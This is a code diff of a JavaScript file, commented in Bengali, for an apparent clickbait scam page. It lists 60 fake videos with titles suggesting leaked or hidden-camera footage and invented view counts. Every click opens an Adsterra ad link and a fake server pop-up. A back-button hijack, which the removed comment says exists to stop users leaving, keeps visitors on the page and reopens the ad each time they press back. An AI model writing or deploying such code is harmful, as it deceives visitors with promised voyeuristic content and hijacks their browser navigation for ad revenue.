@@ -1,38 +1,20 @@
-// ১. তোমার Adsterra Direct Link এখানে বসাও
-const AD_LINK = "YOUR_ADSTERRA_DIRECT_LINK_HERE";
+// ১. তোমার Adsterra Direct Link
+const AD_LINK = "https://www.effectivegatecpm.com/t8pg9iar0?key=855ec9927c577f1ea619e109c15252e6";
 
-// ২. ভাইরাল টাইটেল দিয়ে ৬০টি ভিডিওর লিস্ট জেনারেট করার ফাংশন
-const viralNames = [
-    "Viral_Private_Clip", 
-    "Hidden_Cam_Session", 
-    "MMS_Trending_Now", 
-    "Leaked_Full_HD", 
-    "College_Secret_Vlog",
-    "Hotel_Room_Secret",
-    "Social_Media_Leak_2026",
-    "Private_Party_Uncut"
-];
+// ২. ৬০টি ভিডিও জেনারেট করা
+const titles = ["Viral_Private_Clip", "Hidden_Cam_Session", "MMS_Trending_Now", "Leaked_Full_HD", "Secret_Vlog"];
 
-function generateVideoGrid() {
+function buildGrid() {
     const grid = document.getElementById('video-grid');
-    if (!grid) return;
-    
     let html = '';
-    
     for (let i = 1; i <= 60; i++) {
-        // রেন্ডম ডাটা জেনারেশন
-        const name = viralNames[Math.floor(Math.random() * viralNames.length)];
-        const views = (Math.random() * (3.5 - 0.2) + 0.2).toFixed(1) + "M";
-        const duration = Math.floor(Math.random() * 12) + ":" + Math.floor(Math.random() * 50 + 10);
-        const randomThumbID = i + 100; // আলাদা আলাদা থাম্বনেইল এর জন্য
-
+        const t = titles[Math.floor(Math.random() * titles.length)];
+        const views = (Math.random() * 3 + 0.1).toFixed(1) + "M";
         html += `
             <div class="v-card" onclick="handleAdClick()">
-                <div class="v-thumb" style="background-image: url('https://picsum.photos/seed/${randomThumbID}/200/120')">
-                    <span class="v-duration">${duration}</span>
-                </div>
+                <div class="v-thumb" style="background-image: url('https://picsum.photos/seed/${i+50}/200/120')"></div>
                 <div class="v-info">
-                    <h4>${name}_Part_${i}_HD.mp4</h4>
+                    <h4>${t}_Part_${i}_Full_HD.mp4</h4>
                     <p>${views} views • ${i}h ago</p>
                 </div>
             </div>`;
@@ -40,40 +22,23 @@ function generateVideoGrid() {
     grid.innerHTML = html;
 }
 
-// ৩. অ্যাড ফাংশন (Custom Server Modal সহ)
+// ৩. অ্যাড ফাংশন
 function handleAdClick() {
-    // নতুন ট্যাবে অ্যাড ওপেন হবে
-    window.open(AD_LINK, '_blank'); 
-    
-    // কাস্টম সার্ভার মোডাল (পপ-আপ) দেখাবে
-    const modal = document.getElementById('server-modal');
-    if (modal) {
-        modal.style.display = 'flex';
-    }
+    window.open(AD_LINK, '_blank');
+    document.getElementById('server-modal').style.display = 'flex';
 }
 
-// ৪. মোডাল বন্ধ করার ফাংশন
 function closeModal() {
-    const modal = document.getElementById('server-modal');
-    if (modal) {
-        modal.style.display = 'none';
-    }
+    document.getElementById('server-modal').style.display = 'none';
 }
 
-// ৫. Back Button Lock (ইউজার যেন সাইট থেকে বের হতে না পারে)
+// ৪. Back Button Lock
 (function() {
-    // হিস্টোরিতে একটি ফেক স্টেট পুশ করা
     window.history.pushState(null, null, window.location.href);
-    
     window.onpopstate = function() {
-        // ইউজার ব্যাক চাপলে আবার অ্যাড ওপেন হবে
         window.open(AD_LINK, '_blank');
-        // তাকে আবার একই পেজে আটকে রাখা
         window.history.pushState(null, null, window.location.href);
     };
 })();
 
-// ৬. সাইট লোড হওয়ার সাথে সাথে ভিডিও গ্রিড তৈরি হবে
-window.onload = function() {
-    generateVideoGrid();
-};
+window.onload = buildGrid;
